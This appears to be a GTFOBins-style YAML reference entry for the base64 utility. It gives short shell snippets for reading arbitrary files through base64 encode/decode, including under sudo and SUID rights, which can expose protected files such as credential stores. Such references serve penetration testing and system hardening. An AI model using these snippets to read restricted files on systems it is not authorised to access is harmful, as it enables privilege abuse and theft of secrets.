---
functions:
  sudo-enabled:
    - code: |
        LFILE=file_to_read
        sudo base64 "$LFILE" | base64 -d
  suid-enabled:
    - code: |
        LFILE=file_to_read
        ./base64 "$LFILE" | base64 -d
  file-read:
    - code: |
        LFILE=file_to_read
        base64 "$LFILE" | base64 -d
---
